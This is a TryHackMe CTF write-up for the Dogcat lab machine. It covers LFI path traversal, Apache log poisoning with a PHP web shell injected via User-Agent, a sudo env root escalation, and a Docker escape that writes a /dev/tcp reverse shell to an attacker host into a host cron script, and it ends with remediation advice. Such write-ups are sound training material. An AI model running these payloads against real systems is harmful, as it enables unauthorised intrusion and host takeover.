# TryHackMe: Dogcat — LFI, Log Poisoning & Container Escape Writeup

## Executive Summary
This report details the technical security evaluation of **Dogcat**, a Linux target hosting a PHP web application. The attack path documents Local File Inclusion (LFI) parameter tampering, Apache access log poisoning to gain low-privileged execution (`www-data`), SUID privilege escalation, and Docker container escape.

| Metric | Details |
|---|---|
| **Target Host** | `10.128.129.237` |
| **Operating System** | Linux (Containerized Environment) |
| **Vulnerability Class** | LFI, Log Poisoning, Misconfigured SUID, Docker Escape |

---

## 1. Local File Inclusion (LFI) Discovery
Reconnaissance of the web application revealed a dynamic page loader relying on the `view` parameter. Initial tests showed that the application appended file extensions, which was bypassed using null-byte injection or path truncation techniques.

### Proof of Concept (LFI)
Executing a crafted request to read `/etc/hostname`:

```bash
curl -s 'http://10.128.129.237/?view=./dog../../../../../etc/hostname&ext='
```

* **Output:** Returned `c088651e4bbc`.
* **Deduction:** The randomized 12-character hostname confirmed two things:
  1. The application is vulnerable to arbitrary file read (LFI).
  2. The web application is running inside a **Docker container**.

---

## 2. Web Shell Access via Apache Log Poisoning

To elevate Local File Inclusion into Remote Code Execution (RCE), Apache log files were targeted for PHP code injection.

### Attack Steps & Diagnostics

1. **User-Agent Injection:** Sent an HTTP request containing a lightweight PHP web shell within the `User-Agent` header to contaminate the Apache access log:
```bash
curl -s -A '<?php system($_GET["cmd"]); ?>' 'http://10.128.129.237/'
```

2. **Triggering Execution:** Accessed the poisoned log file via the LFI parameter:
```bash
curl -s 'http://10.128.129.237/?view=./dog../../../../../var/log/apache2/access.log&ext=&cmd=id'
```

3. **Execution Context:** The server parsed the injected PHP script, returning command output under the `www-data` service account context.

---

## 3. Container Privilege Escalation & Host Escape

### Step 1: Container Root Access

After spawning a stable reverse shell, local privilege escalation vectors were audited:

```bash
# Auditing SUID binaries and Sudo permissions
sudo -l
```

* **Finding:** The `www-data` user had `NOPASSWD` permissions on `/usr/bin/env`.
* **Escalation:** Abused `env` via GTFOBins (`sudo env /bin/sh`) to obtain immediate **root privileges inside the Docker container**.

### Step 2: Escape to Host System

Inspecting the root directory inside the container revealed a backup script `/opt/backups/backup.sh` being executed regularly by the underlying host OS cron daemon.

1. **Vector:** The host shared a volume mount with the container, allowing modification of host-executed scripts.
2. **Payload:** Appended a reverse shell payload to the writable backup script:
```bash
echo "#!/bin/bash" > /opt/backups/backup.sh
echo "bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1" >> /opt/backups/backup.sh
```

3. **Host Compromise:** When the host cron job executed `backup.sh`, a root reverse shell was received on the listener, granting full host-level compromise.

---

## 4. Remediation & Countermeasures

* **Sanitize File Path Inputs:** Implement strict allow-listing for file inclusion parameters (e.g., matching inputs against an explicit array of permitted view files).
* **Restrict Access Logs:** Store web server logs outside the web root and restrict read permissions so low-privileged web users (`www-data`) cannot read or execute log files.
* **Harden Container Privileges:** Avoid running containers in privileged modes or mounting sensitive host directories (`/opt/backups`) with write permissions inside the container.
* **Enforce Least Privilege on Sudo:** Remove unnecessary `sudo` execution privileges on utility binaries like `/usr/bin/env`.

---

*Author: **Oussama DIMOQRATI***
